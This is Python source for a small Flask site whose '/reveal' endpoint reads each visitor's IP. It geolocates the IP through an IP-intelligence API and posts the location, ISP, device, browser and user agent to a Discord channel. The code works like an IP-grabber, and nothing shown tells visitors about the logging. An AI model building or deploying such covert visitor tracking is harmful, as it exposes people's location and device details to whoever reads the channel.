from flask import Flask, request, jsonify, render_template
import requests
import os
import json
import datetime
from datetime import datetime
from dotenv import load_dotenv
from user_agents import parse as parse_ua

load_dotenv()
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_CHANNEL_ID = os.getenv("DISCORD_IPADDRESS_CHANNEL")
OUTSIDE_PORT = os.getenv("OUTSIDE_PORT")
ABSTRACT_API_KEY = os.getenv("ABSTRACT_API_KEY")
PATH_TO_WEBSITE = os.getenv("PATH_TO_WEBSITE")

app = Flask(__name__, template_folder=PATH_TO_WEBSITE + "/templates", static_folder=PATH_TO_WEBSITE + "/static")

# Function to send IP data to Discord
def send_ip_to_discord(ip, data, user_agent_raw, method):
    url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages"
    headers = {
        "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
        "Content-Type": "application/json"
    }

    current_time = datetime.now()

    # Parse user agent string
    ua = parse_ua(user_agent_raw or "")

    device_type = "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other"
    os_info = f"{ua.os.family} {ua.os.version_string}"
    browser_info = f"{ua.browser.family} {ua.browser.version_string}"

    #setup the embed message
    embed = {
        "title": "New Visitor",
        "description": f"IP Address: `{ip}`",
        "color": 65280,  # green
        "author": {
            "name": "Abstract IP Intelligence",
            "url": "https://www.abstractapi.com/",
            "icon_url": "https://cdn.prod.website-files.com/65166126ca18241731aa26b0/65390de624cb65770560dda5_FAV.png"
        },
        "fields": [
            {"name": "Approximate Location", "value": f"{data['location']['city']}, {data['location']['region']}, {data['location']['country']} {data['flag']['emoji']}", "inline": False},
            {"name": "Service Provider", "value": f"ISP: {data['company']['name']}\n"f"Domain: {data['company']['domain']}", "inline": False},
            {"name": "Request Method", "value": method, "inline": True},
            {"name": "Device Type", "value": device_type, "inline": True},
            {"name": "Operating System", "value": os_info, "inline": True},
            {"name": "Browser", "value": browser_info, "inline": True},
            {"name": "User Agent String", "value": user_agent_raw or "Unknown", "inline": False},
            {"name": "Timestamp", "value": current_time.strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
        ]
    }

    json_data = {"embeds": [embed]}

    response = requests.post(url, headers=headers, json=json_data)
    
    if response.status_code != 200 and response.status_code != 204:
        print("Failed to send message to Discord:", response.text)

# ---------- Flask Routes -----------

@app.route("/", methods=["GET"])
def render_page():
    return render_template("index.html")

@app.route("/goon", methods=["GET"])
def render_goon_page():
    return render_template("goonIndex.html")

@app.route("/reveal", methods=["POST"])
def reveal_ip():

    forwarded = request.headers.get("X-Forwarded-For", request.remote_addr)
    ip = forwarded.split(",")[0].strip()
    user_agent = request.headers.get("User-Agent")
    method = request.method

    # Make a request to the Abstract API to get IP intelligence data and parse the response
    response = requests.get(f"https://ip-intelligence.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&ip_address=" + ip)
    data = json.loads(response.text)

    send_ip_to_discord(ip, data, user_agent, method)

    #return response.json()  # Return the JSON response directly from the Abstract API
    return jsonify({"ip": ip})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=OUTSIDE_PORT)